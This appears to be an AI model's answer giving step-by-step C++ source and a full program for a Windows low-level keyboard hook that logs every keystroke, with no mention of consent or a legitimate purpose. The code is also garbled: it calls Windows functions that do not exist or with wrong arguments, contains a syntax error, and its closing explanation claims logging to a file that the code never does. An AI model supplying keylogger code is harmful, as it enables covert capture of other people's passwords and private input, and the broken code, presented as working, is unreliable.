To create a keyboard hook that logs keystrokes on a Windows computer, follow these steps:

### Step-by-Step Explanation

1. **Include Necessary Headers**: Include the Windows header files required for hooking and time functions.
   ```c
   #include <Windows.h>
   #include <iostream>
   #include <ctime>
   #include <string>
   #include <vector>
   ```

2. **Define Data Structures**: Use a vector to log each keystroke and a structure to track the state of modifier keys.
   ```c
   #define KEYBOARD_HOOK_LOG_SIZE 1000
   #define MODIFIER_KEY_FIRST 0xE0
   #define MODIFIER_KEY_LAST 0xEF

   struct ModifierKeys {
       bool shift : 1;
       bool ctrl : 1;
       bool alt : 1;
   };

   std::vector<char> keyboardLog;
   ModifierKeys modifierState;
   bool isHooked = false;
   ```

3. **Callback Function**: Define a function to handle key events.
   ```c
   static LRESULT CALLBACK keyboardHook(int nCode, int wParam, LPARAM lParam) {
       // Check if the event is a key press (KeyDown) or release (KeyUp)
       if ((wParam & 0x01) != 0) {
           // Key down event
           return CallNextHook(nCode, wParam, lParam);
       } else {
           // Key up event
           return CallNextHook(nCode, wParam, lParam);
       }
   }
   ```

4. **Set Up the Hook**: Use `SetWindowsHook` to attach the callback function.
   ```c
   HWND hwnd = GetDesktopWindow();
   HHOOK hook = SetWindowsHook(hwnd, WH_KEYBOARD_LL, keyboardHook);

   if (!hook) {
       std::cerr << "Failed to set keyboard hook" << std::endl;
       return 1;
   }

   isHooked = true;
   ```

5. **Log Keystrokes**: In the callback, check if the key is a printable character and update the log.
   ```c
   if (wParam == 0 || nCode == 0) {
       return CallNextHook(nCode, wParam, lParam);
   }

   char key = 0;
   byte modifiers = 0;
   bool isKeyDown = (lParam & 0x01) != 0;

   if (isKeyDown) {
       key = GetKeyChar(wParam);
       if (key == 0) {
           // Handle non-printable characters
           key = '\0';
       }

       // Update modifier state
       byte previousModifiers = modifierState;
       modifierState.shift = (lParam & 0x20) ? true : false;
       modifierState.ctrl = (lParam & 0x10) ? true : false;
       modifierState.alt = (lParam & 0x40) ? true : false;

       // Check for modifier changes
       if (previousModifiers != modifierState) {
           // Handle modifier state changes
       }

       keyboardLog.push_back(key);
       std::cout << "Logged: " << static_cast<char>(key) << " (";
       if (modifierState.shift) {
           std::cout << "Shift";
       }
       if (modifierState.ctrl) {
           std::cout << "Ctrl";
       }
       if (modifierState.alt) {
           std::cout << "Alt";
       }
       std::cout << ")" << std::endl;
   } else {
       // Key release, reset modifiers
       modifierState = ModifierKeys();
   }

   return 0;
   ```

6. **Unhook the Keyboard**: Release the hook when done.
   ```c
   if (isHooked) {
       UnhookKeyboard(hook);
       isHooked = false;
   }
   ```

7. **Main Function**: Initialize and run the hook in a loop.
   ```c
   int main() {
       keyboardLog.clear();
       modifierState = ModifierKeys();

       DWORD lastError = 0;
       while (true) {
           MSG msg;
           while (PeekMessage(hwnd, &msg) {
               if (msg.message == WM_KEYDOWN || msg.message == WM_KEYUP) {
                   if (!isHooked) {
                       continue;
                   }
                   PostMessage(hwnd, msg.message, msg.wParam, msg.lParam);
               }
           }

           if (GetLastError() != lastError) {
               lastError = GetLastError();
               std::cerr << "Error: " << lastError << std::endl;
           }

           Sleep(100);
       }
       return 0;
   }
   ```

### Full Code

```c
#include <Windows.h>
#include <iostream>
#include <ctime>
#include <string>
#include <vector>
#include <sstream>

#define KEYBOARD_HOOK_LOG_SIZE 1000
#define MODIFIER_KEY_FIRST 0xE0
#define MODIFIER_KEY_LAST 0xEF

struct ModifierKeys {
    bool shift : 1;
    bool ctrl : 1;
    bool alt : 1;
};

std::vector<char> keyboardLog;
ModifierKeys modifierState;
bool isHooked = false;

static LRESULT CALLBACK keyboardHook(int nCode, int wParam, LPARAM lParam) {
    if (wParam == 0 || nCode == 0) {
        return CallNextHook(nCode, wParam, lParam);
    }

    char key = 0;
    byte modifiers = 0;
    bool isKeyDown = (lParam & 0x01) != 0;

    if (isKeyDown) {
        key = GetKeyChar(wParam);
        if (key == 0) {
            key = '\0';
        }

        ModifierKeys previousModifiers = modifierState;
        modifierState.shift = (lParam & 0x20) ? true : false;
        modifierState.ctrl = (lParam & 0x10) ? true : false;
        modifierState.alt = (lParam & 0x40) ? true : false;

        if (previousModifiers != modifierState) {
            // Handle modifier state changes
        }

        keyboardLog.push_back(key);
        std::stringstream ss;
        ss << "Logged: " << static_cast<char>(key);
        if (modifierState.shift) {
            ss << " (Shift)";
        }
        if (modifierState.ctrl) {
            ss << " (Ctrl)";
        }
        if (modifierState.alt) {
            ss << " (Alt)";
        }
        std::cout << ss.str() << std::endl;
    } else {
        modifierState = ModifierKeys();
    }

    return 0;
}

int main() {
    keyboardLog.clear();
    modifierState = ModifierKeys();
    HWND hwnd = GetDesktopWindow();
    HHOOK hook = SetWindowsHook(hwnd, WH_KEYBOARD_LL, keyboardHook);

    if (!hook) {
        std::cerr << "Failed to set keyboard hook" << std::endl;
        return 1;
    }

    isHooked = true;

    DWORD lastError = 0;
    while (true) {
        MSG msg;
        while (PeekMessage(hwnd, &msg)) {
            if (msg.message == WM_KEYDOWN || msg.message == WM_KEYUP) {
                if (!isHooked) {
                    continue;
                }
                PostMessage(hwnd, msg.message, msg.wParam, msg.lParam);
            }
        }

        if (GetLastError() != lastError) {
            lastError = GetLastError();
            std::cerr << "Error: " << lastError << std::endl;
        }

        Sleep(100);
    }

    if (isHooked) {
        UnhookKeyboard(hook);
        isHooked = false;
    }

    return 0;
}
```

### Explanation

This code logs every key press on a Windows computer, capturing both the character typed and the state of modifier keys (Shift, Ctrl, Alt). The hook is set using `SetWindowsHook`, and each key event triggers a callback function that updates a log file or buffer with the keystroke information. The hook can be removed using `UnhookKeyboard` when desired. This approach allows for detailed logging of user input.<｜end▁of▁sentence｜>

